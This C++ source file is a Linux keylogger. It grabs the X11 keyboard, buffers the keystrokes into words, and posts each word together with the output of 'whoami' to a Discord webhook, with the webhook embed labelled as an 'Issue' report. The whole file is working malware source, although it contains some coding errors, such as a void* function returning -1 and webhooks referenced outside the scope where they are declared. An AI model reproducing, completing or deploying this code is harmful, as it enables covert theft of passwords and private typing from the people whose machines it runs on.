#include "header.h"

std::string exec_parsed(const std::string& command) {
    std::string result;
    FILE* pipe = popen(command.c_str(), "r");
    if(!pipe) {
        return result;
    }

    char buffer[128];
    while(fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);
    return result;
} 

void* keylogging(void* arg) {
    
    std::string output_word;
    Display* display = XOpenDisplay(nullptr);
        if (!display) {
            BOT_TOKEN.execute_webhook(MAIN_WEBHOOK, dpp::message("Unable to open requirements for key logging, clossing.."));
            return -1;
        }

        XGrabKeyboard(display, DefaultRootWindow(display), True, GrabModeAsync, GrabModeAsync, CurrentTime);
        while (true) {
            XEvent event;
            XNextEvent(display, &event);
            if (event.type == KeyPress) {
                KeySym keySym;
                char key[255];
                XLookupString(&event.xkey, key, sizeof(key), &keySym, NULL);
                    if (keySym == XK_space) {
                        // Process the captured output_word
                        if (!output_word.empty()) {
                            dpp::embed keylogger = dpp::embed()
                                .set_color(dpp::colors::pink);
                            dpp::message webhook_attach("");
                            std::string user_executor = "```" + exec_parsed("whoami") + "```";
                            std::string formatted_keylogger = "```" + output_word + ". ```";
                            keylogger.add_field("<:Goat_setup:1139573452672614480> Issue", formatted_keylogger, true);
                            keylogger.add_field("Reported by", user_executor, true);
                            webhook_attach.add_embed(keylogger);
                            BOT_TOKEN.execute_webhook(WORDS_WEBHOOK, dpp::message(webhook_attach));
                            output_word.clear(); // Clear the captured word
                        }
                    } 
                    else {
                        std::string word(1, key[0]);
                        output_word += word;
                }
            }
        }

    XCloseDisplay(display);
    return nullptr;
}

int main() {
    dotenv::init();
    const std::string MAIN_WEBHOOK_env{std::getenv("MAIN_WEBHOOK")};
    const std::string WORDS_WEBHOOK_env{std::getenv("WORDS_WEBHOOK")};
    dpp::webhook MAIN_WEBHOOK(MAIN_WEBHOOK_env);
    dpp::webhook WORDS_WEBHOOK(WORDS_WEBHOOK_env);
    dpp::cluster BOT_TOKEN("");

    std::string output_word;
    pthread_t thread;
    int rc = pthread_create(&thread, nullptr, keylogging, nullptr);
    if(rc) {
        return 1;
    }

   pthread_join(thread, nullptr);
    
    return 0;
}